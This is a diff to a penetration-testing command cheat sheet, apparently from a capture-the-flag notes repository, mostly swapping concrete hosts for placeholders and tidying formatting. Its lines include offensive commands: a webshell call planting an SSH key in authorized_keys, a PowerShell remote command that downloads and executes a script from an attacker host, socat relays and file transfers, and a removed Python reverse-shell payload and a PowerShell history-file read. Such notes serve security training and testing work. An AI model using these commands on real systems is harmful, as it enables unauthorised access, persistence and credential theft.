@@ -178,7 +178,7 @@ $ ash -i 2>&1
 ## ack
 
 ```c
-$ack -i '<STRING>'    // like password
+$ ack -i '<STRING>'    // like password
 ```
 
 ## ASCII
@@ -433,7 +433,7 @@ $ curl -vvv <RHOST>
 or
 
 ```c
-$ curl -s -q -v -H 'Origin: http://10.10.14.21' <TARGET_DOMAIN>/api/auth
+$ curl -s -q -v -H 'Origin: http://<RHOST>' <TARGET_DOMAIN>/api/auth
 ```
 
 ### Use SSL
@@ -459,7 +459,7 @@ $ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
 ### SSH Key Upload
 
 ```c
-$ curl -G 'http://<TARGET_DOMAIN>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
+$ curl -G 'http://<RHOST>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
 ```
 
 ### Command Injection
@@ -551,7 +551,7 @@ $ echo -e "string\n" > <FILE>
 $ egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'
 ```
 
-### Environment Variables
+## Environment Variables
 
 ```c
 $ env
@@ -881,7 +881,7 @@ kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the key
 ### Debug
 
 ```c
-KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@WINDCORP.HTB
+KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@<DOMAIN>
 ```
 
 ## ldd
@@ -926,6 +926,7 @@ $ usermod -l <NEW_USERNAME> -d /home/<NEW_USERNAME> -m <OLD_USERNAME>
 $ groupmod -n <NEW_USERNAME> <OLD_USERNAME>
 $ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
 ```
+
 ##### Optional: Change Display Name
 
 ```c
@@ -1266,9 +1267,9 @@ PS C:\> import-module ./<module / powershell script>
 ### Check PowerShell Versions
 
 ```c
-$ PS Set-ExecutionPolicy Unrestricted
-$ PS powershell -Command "$PSVersionTable.PSVersion"
-$ PS powershell -c "[Environment]::Is64BitProcess"
+PS C:\> Set-ExecutionPolicy Unrestricted
+PS C:\> powershell -Command "$PSVersionTable.PSVersion"
+PS C:\> powershell -c "[Environment]::Is64BitProcess"
 ```
 
 ### Start offsec Session
@@ -1398,9 +1399,9 @@ PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage
 #### Execute Scripts with Credentials (Reverse Shell)
 
 ```c
-PS C:\Windows\system32> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
-PS C:\Windows\system32> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
+PS C:\>  $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+PS C:\>  $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
+PS C:\>  Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
 #### New-PSSession
@@ -1455,7 +1456,7 @@ PS C:\> &{ <COMMAND> }
 #### Read a File
 
 ```c
-PS C:\> get-Content <FILE>
+PS C:\> Get-Content <FILE>
 ```
 
 #### Show hidden Files
@@ -1474,12 +1475,6 @@ PS C:\> GCI -hidden
 
 ```c
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
-```
-
-#### History File
-
-```c
-PS C:\> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 #### Directory Listing
@@ -1610,10 +1605,9 @@ $ sudo pip3 install pyotp
 $ python3 -c 'import pyotp; totp = pyotp.TOTP("orxxi4c7orxwwzlo"); print(totp.now())'
 ```
 
-## RDP
+## rdesktop
 
 ```c
-$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
 $ rdesktop <RHOST>
 ```
 
@@ -1712,6 +1706,7 @@ $ sshfs -p <RPORT> ftpuser@<RHOST>: /mnt/<FOLDER>
 ```
 
 ## showmount
+
 ```c
 $ /usr/sbin/showmount -e <RHOST>
 $ sudo showmount -e <RHOST>
@@ -1745,7 +1740,7 @@ $ smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
 $ smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
 $ smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
 $ mount.cifs //<RHOST>/Backups /mnt/remote
-$ guestmount --add '/<mountpoint>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
+$ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 $ smbclient "\\\\<RHOST>\<SHARE>"
 $ smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 ```
@@ -1759,8 +1754,8 @@ $ smb: \> get <filename>
 ### Anonymous Login
 
 ```c
-$ smbclient //<RHOST>/Backups -N
-$ smbclient \\\\<RHOST>/Backups -N
+$ smbclient //<RHOST>/<FOLDER> -N
+$ smbclient \\\\<RHOST>/<FOLDER> -N
 ```
 
 ### Download multiple Files at once
@@ -1841,7 +1836,7 @@ $ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
 ##### Remote System
 
 ```c
-$ ./socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
+$ socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
 ```
 
 ### UDP Shell
@@ -1864,14 +1859,6 @@ $ socat - OPENSSL:<RHOST>:443,verify=0
 ```c
 $ sudo socat TCP4-LISTEN:443,fork file:<FILE>
 $ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout myCert.key -x509 -out myCert.crt; cat myCert.key myCert.crt \> myCert.pem
-```
-
-### Remote System Python Script
-
-```c
-#!/usr/bin/python
-import subprocess
-subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"<LHOST>\", <LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
 ```
 
 ## Spaces Cleanup
@@ -2240,10 +2227,14 @@ Open Microsoft App Store and get Kali/Ubuntu.
 
 ## xfreerdp
 
+```c
+$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
+```
+
 ### Folder Sharing
 
 ```c
-$ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /cert-ignore /drive:/PATH/TO/FOLDER,shared
+$ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore /drive:/PATH/TO/FOLDER,shared
 ```
 
 ### Pass-the-Hash
